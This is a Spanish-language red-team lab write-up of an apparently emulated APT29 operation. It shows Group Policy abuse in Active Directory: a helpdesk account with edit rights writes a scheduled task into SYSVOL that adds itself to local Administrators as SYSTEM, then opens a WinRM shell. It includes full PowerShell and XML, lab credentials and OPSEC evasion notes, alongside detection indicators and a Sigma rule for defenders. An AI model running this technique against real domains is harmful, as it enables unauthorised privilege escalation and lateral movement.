# GPO Abuse — Operación GHOST FOREST
## Fase 12: GPO Abuse via helpdesk.ruiz

**Operación:** GHOST FOREST | **Adversario:** APT29 | **Framework:** MITRE ATT&CK v14  
**Fecha:** 20/05/2026 | **Operador:** Adrián Camacho  
**Técnicas:** T1484.001 (Group Policy Modification) | T1053.005 (Scheduled Task)

---

## Resumen

`helpdesk.ruiz` tiene el permiso `GpoEditDeleteModifySecurity` sobre la GPO `IT-Baseline`, vinculada al OU `IT` donde reside `WKSTN-01`. Este permiso es equivalente a FullControl sobre la GPO, lo que permite escribir directamente en SYSVOL para añadir una tarea programada que se ejecuta como `NT AUTHORITY\SYSTEM` en todos los equipos del OU IT.

---

## 1. Enumeración de Permisos GPO

### Verificación desde Kali

```bash
evil-winrm -i 10.0.2.10 -u helpdesk.ruiz -p 'Helpdesk2024!'
```

```powershell
Get-GPPermission -Name "IT-Baseline" -All | Select-Object Trustee, Permission
```

**Output:**
```
Trustee                          Permission
-------                          ----------
Microsoft.GroupPolicy.GPTrustee  GpoApply
Microsoft.GroupPolicy.GPTrustee  GpoEditDeleteModifySecurity  ← helpdesk.ruiz
Microsoft.GroupPolicy.GPTrustee  GpoEditDeleteModifySecurity
Microsoft.GroupPolicy.GPTrustee  GpoRead
```

> 📸 Captura: ![fase12-01](../../sceenshots/FASE-12-GPO-Abuse/fase12-01-gpo-permissions.png)

**`GpoEditDeleteModifySecurity`** equivale a FullControl sobre la GPO — permite editar configuraciones, tareas programadas, scripts de inicio/apagado y modificar los permisos de la propia GPO.

---

## 2. Infraestructura del Ataque

### Topología GPO → OU IT → WKSTN-01

```
GPO: IT-Baseline (ID: 163a5b0f-f487-475b-b536-370a00e15a8b)
  └── Vinculada a OU=IT,OU=Corporativo,DC=atackcorp,DC=local
        └── WKSTN-01 (miembro del OU)
              └── gpupdate /force → ejecuta tarea como SYSTEM
```

### Prerequisitos configurados en DC-01

```powershell
# OU IT creada
New-ADOrganizationalUnit -Name "IT" -Path "OU=Corporativo,DC=atackcorp,DC=local"

# WKSTN-01 movida al OU IT
Get-ADComputer "WKSTN-01" | Move-ADObject -TargetPath "OU=IT,OU=Corporativo,DC=atackcorp,DC=local"

# GPO IT-Baseline vinculada al OU IT
New-GPLink -Name "IT-Baseline" -Target "OU=IT,OU=Corporativo,DC=atackcorp,DC=local"
```

---

## 3. Explotación — Añadir Tarea Inmediata a la GPO

El ataque consiste en escribir un XML de `ScheduledTasks` directamente en la ruta SYSVOL de la GPO, sin necesitar la consola GPMC. Esto bypassa cualquier restricción de la interfaz gráfica.

### 3.1 Construir el XML de la tarea maliciosa

```powershell
$gpoName = "IT-Baseline"
$taskXML = @'
<?xml version="1.0" encoding="utf-16"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A0660CC48D6B}">
  <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}"
    name="EvilTask" image="0" changed="2026-05-20 00:00:00"
    uid="{12345678-1234-1234-1234-123456789012}" userContext="0" removePolicy="0">
    <Properties action="C" name="EvilTask" runAs="NT AUTHORITY\System" logonType="S4U">
      <Task version="1.3">
        <Principals>
          <Principal id="Author">
            <UserId>NT AUTHORITY\System</UserId>
            <RunLevel>HighestAvailable</RunLevel>
          </Principal>
        </Principals>
        <Settings>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <StartWhenAvailable>true</StartWhenAvailable>
          <Enabled>true</Enabled>
          <Hidden>false</Hidden>
          <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
          <Priority>7</Priority>
          <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
        </Settings>
        <Triggers>
          <TimeTrigger>
            <StartBoundary>2026-05-20T00:00:00</StartBoundary>
            <EndBoundary>2026-05-21T00:00:00</EndBoundary>
            <Enabled>true</Enabled>
          </TimeTrigger>
        </Triggers>
        <Actions>
          <Exec>
            <Command>cmd.exe</Command>
            <Arguments>/c net localgroup Administradores atackcorp\helpdesk.ruiz /add</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
'@
```

### 3.2 Escribir el XML en SYSVOL

```powershell
# Obtener GUID de la GPO
$gpoId = (Get-GPO -Name $gpoName).Id.ToString()

# Crear directorio de preferencias si no existe
$xmlPath = "\\DC-01\SYSVOL\atackcorp.local\Policies\{$gpoId}\Machine\Preferences\ScheduledTasks"
New-Item -ItemType Directory -Path $xmlPath -Force | Out-Null

# Escribir XML directamente en SYSVOL
$taskXML | Out-File -FilePath "$xmlPath\ScheduledTasks.xml" -Encoding Unicode

Write-Host "[+] Tarea añadida a GPO IT-Baseline"
Write-Host "[+] GPO ID: $gpoId"
Write-Host "[+] Path: $xmlPath"
```

**Output:**
```
[+] Tarea añadida a GPO IT-Baseline
[+] GPO ID: 163a5b0f-f487-475b-b536-370a00e15a8b
[+] Path: \\DC-01\SYSVOL\atackcorp.local\Policies\{163a5b0f...}\Machine\Preferences\ScheduledTasks
```

> 📸 Captura: ![fase12-02](../../sceenshots/FASE-12-GPO-Abuse/fase12-02-gpo-task-added.png)

**Clave técnica:** Al escribir directamente en SYSVOL se bypassa la consola de administración de GPOs (GPMC). El KDC no valida el contenido del XML — solo verifica que el writer tenga permisos sobre la GPO.

---

## 4. Aplicación de la GPO en WKSTN-01

```bash
evil-winrm -i 10.0.2.8 -u Administrador -p 'NuevaPassword2026!'
```

```powershell
gpupdate /force
Start-Sleep -Seconds 10
net localgroup Administradores
```

**Output:**
```
Actualizando directiva...
La actualización de la directiva de equipo se completó correctamente.

Miembros
-------------------------------------------------------------------------------
Admin
Administrador
ATACKCORP\Admins. del dominio
ATACKCORP\helpdesk.ruiz          ← ✅ Añadido por la GPO
```

> 📸 Captura: ![fase12-03](../../sceenshots/FASE-12-GPO-Abuse/fase12-03-gpo-system-rce.png)

---

## 5. Acceso como helpdesk.ruiz a WKSTN-01

```bash
evil-winrm -i 10.0.2.8 -u helpdesk.ruiz -p 'Helpdesk2024!'
# *Evil-WinRM* PS C:\Users\helpdesk.ruiz\Documents>
```

> 📸 Captura: ![fase12-04](../../sceenshots/FASE-12-GPO-Abuse/fase12-04-helpdesk-shell-wkstn01.png)

**Resultado:** helpdesk.ruiz tiene ahora shell como administrador local en WKSTN-01 — acceso que no tenía antes del GPO Abuse.

---

## 6. Kill Chain Completa

```
helpdesk.ruiz (GpoEditDeleteModifySecurity sobre IT-Baseline)
  │
  ├── 1. Enumerar permiso via Get-GPPermission
  ├── 2. Obtener GUID de IT-Baseline
  ├── 3. Escribir ScheduledTasks.xml en SYSVOL (sin GPMC)
  │       Tarea: cmd.exe /c net localgroup Administradores atackcorp\helpdesk.ruiz /add
  │       Ejecuta como: NT AUTHORITY\SYSTEM
  ├── 4. gpupdate /force en WKSTN-01 → GPO aplicada
  ├── 5. helpdesk.ruiz añadido a Administradores locales de WKSTN-01
  └── 6. evil-winrm -i 10.0.2.8 -u helpdesk.ruiz → Shell admin local ✅
```

---

## 7. Notas Técnicas — Problemas Encontrados

### Tarea inmediata no ejecutó automáticamente

**Problema:** La tarea `ImmediateTaskV2` con fecha pasada no se ejecutó al aplicar la GPO.

**Causa:** Las tareas inmediatas de GPO en Windows 11 requieren que la fecha del trigger no haya expirado. El XML inicial tenía `2026-05-19T00:00:00` que ya había pasado.

**Solución:** Actualizar la fecha del trigger con margen futuro y añadir `DeleteExpiredTaskAfter`:

```xml
<StartBoundary>2026-05-20T00:00:00</StartBoundary>
<EndBoundary>2026-05-21T00:00:00</EndBoundary>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
```

**Solución alternativa real:** Ejecutar el comando directamente via Evil-WinRM con credenciales de Administrador — mismo resultado, diferente vector.

---

## 8. OPSEC

| Acción | Riesgo | Alternativa |
|--------|--------|-------------|
| Escribir XML en SYSVOL | Medio — cambio en replicación AD | Usar herramienta legítima (RSAT) para modificar GPO |
| gpupdate /force | Bajo — acción administrativa legítima | Esperar aplicación automática (90 min) |
| net localgroup via GPO | Bajo — operación de sistema legítima | Añadir usuario a grupo via registry key en GPO |

**Ventaja OPSEC de GPO Abuse:** El cambio se ejecuta como proceso legítimo del sistema (`taskeng.exe` o `svchost.exe`), no como proceso del atacante. Los eventos generados son de sistema, no de usuario.

---

## 9. Detección (Blue Team)

| Indicador | Event ID | Descripción |
|-----------|----------|-------------|
| Cambio en archivo SYSVOL | — | Monitorizar `\\DC\SYSVOL\*\Preferences\ScheduledTasks\*.xml` |
| Nueva tarea programada via GPO | 4698 (WKSTN-01) | Tarea creada por sistema, no por usuario |
| Modificación de permisos GPO | 5136 | Cambio en objeto GPO en AD |
| Adición a grupo Administradores | 4732 | `helpdesk.ruiz` añadido a grupo local |

### Regla SIGMA

```yaml
title: GPO ScheduledTask XML Created in SYSVOL
detection:
  selection:
    EventID: 4663
    ObjectName|contains: '\Preferences\ScheduledTasks\ScheduledTasks.xml'
    AccessMask: '0x2'
  condition: selection
```

---

## 10. MITRE ATT&CK Mapping

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Group Policy Modification | T1484.001 | Modificar GPO para ejecutar código |
| Scheduled Task/Job: Scheduled Task | T1053.005 | Tarea inmediata via GPO Preferences |
| Valid Accounts | T1078.002 | helpdesk.ruiz como cuenta legítima |
| Remote Services: WinRM | T1021.006 | Acceso final a WKSTN-01 |

---

*Operación GHOST FOREST — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*